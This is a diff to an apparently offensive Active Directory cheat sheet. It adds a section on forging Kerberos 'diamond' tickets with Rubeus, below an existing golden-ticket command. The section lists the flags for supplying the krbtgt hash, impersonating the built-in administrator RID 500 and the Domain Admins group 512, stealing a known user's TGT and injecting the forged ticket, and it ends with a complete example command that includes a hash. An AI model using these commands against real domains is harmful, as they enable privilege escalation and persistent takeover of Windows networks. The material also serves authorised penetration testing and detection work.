@@ -607,6 +607,27 @@ optional:
 rubeus.exe golden /user:DAdmin123 /rc4:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /printcmd
 ```
 
+#### Diamond:
+```/krbkey:``` krbtgt hash (must be the same hash type as being passed for the user!)
+```/ticketuserid``` - RID of User to be impersonated (likely -500 for builtin or -1104 for DA User)
+```/groups``` - Group RID to be impersonated (likely 512)
+
+optional:
+- ```/tgtdeleg``` - use current user session for identity (self request TGT)
+- ```/user:``` - The known user to steal the TGT of
+- ```/rc4:``` or ```/aes256:``` is the known user hash (from which we steal TGT info for forgery)
+- ```/password:``` - cleartext password of known user
+- ```/enctype:``` - Encryption type to use if using password (Match with krbkey type!)
+- ```/certificate:``` - use certificate for identity
+- ```/domain:``` - specify domain
+- ```/dc:``` - DC
+- ```/ptt``` - inject ticket
+
+```
+rubeus.exe diamond /tgtdeleg /ticketuser:DAdmin /ticketuserid:500 /groups:512 /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C 
+```
+
+
 * * * 
 
 #### Silver:
